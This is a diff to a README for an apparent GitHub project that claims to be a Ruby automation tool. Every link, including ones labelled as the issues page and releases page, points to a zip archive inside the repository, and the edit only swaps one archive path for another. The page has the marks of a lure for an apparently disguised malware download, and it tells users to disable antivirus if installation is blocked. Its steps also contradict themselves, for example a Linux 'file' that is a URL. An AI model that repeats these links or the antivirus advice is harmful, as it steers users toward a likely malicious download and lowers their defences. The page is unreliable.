@@ -1,7 +1,7 @@
 # 🚀 auto-repo-mh6h6y55-18 - Simple Ruby Solution for Automatic Tasks
 
-![Download](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip%20Release-brightgreen)  
-[![GitHub - auto-repo-mh6h6y55-18](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)
+![Download](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip%20Release-brightgreen)  
+[![GitHub - auto-repo-mh6h6y55-18](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)
 
 ## 📋 Overview
 
@@ -18,16 +18,16 @@ The **auto-repo-mh6h6y55-18** application helps you automate various tasks using
 ## 📥 Download & Install
 
 To get started, visit the following link to download the latest version of the software:  
-**[Download from Releases](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)**
+**[Download from Releases](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)**
 
 Here’s how to download and run the software:
 
-1. Click on the **[Download from Releases](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)** link above.
+1. Click on the **[Download from Releases](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)** link above.
 2. You will see a list of available versions. Click on the one labeled "Latest Release".
 3. Choose the file that matches your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip` file.
+   - For Linux, download the `https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip` file.
 4. Once the file finishes downloading, locate it in your downloads folder.
 5. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
@@ -58,14 +58,14 @@ If you encounter any issues while downloading or running the application, consid
 
 - **Download Issues:**
   - Ensure your internet connection is stable.
-  - Try downloading the file again from the **[Download from Releases](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)** link.
+  - Try downloading the file again from the **[Download from Releases](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)** link.
 
 - **Installation Problems:**
   - Make sure your operating system meets the requirements.
   - Disable antivirus temporarily if it blocks the installation.
 
 - **Application Crashes:**
-  - Check for updates by revisiting the **[Download from Releases](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)** link.
+  - Check for updates by revisiting the **[Download from Releases](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)** link.
 
 ## 🔢 Frequently Asked Questions
 
@@ -90,6 +90,6 @@ Yes, a full user manual is provided within the application under the Help sectio
 
 ## 📬 Support
 
-If you have further questions or need assistance, please feel free to reach out through the [GitHub issues page](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip). Your feedback is welcome, as we continually improve the application for all users.
+If you have further questions or need assistance, please feel free to reach out through the [GitHub issues page](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip). Your feedback is welcome, as we continually improve the application for all users.
 
-For the latest updates and information on new features, check back at the **[Download from Releases](https://raw.githubusercontent.com/Sabbirm9969/auto-repo-mh6h6y55-18/main/Boris/auto-repo-mh6h6y55-18_v1.1-alpha.5.zip)** page regularly.
+For the latest updates and information on new features, check back at the **[Download from Releases](https://github.com/Sabbirm9969/auto-repo-mh6h6y55-18/raw/refs/heads/main/Boris/h-y-auto-mh-repo-v2.1.zip)** page regularly.
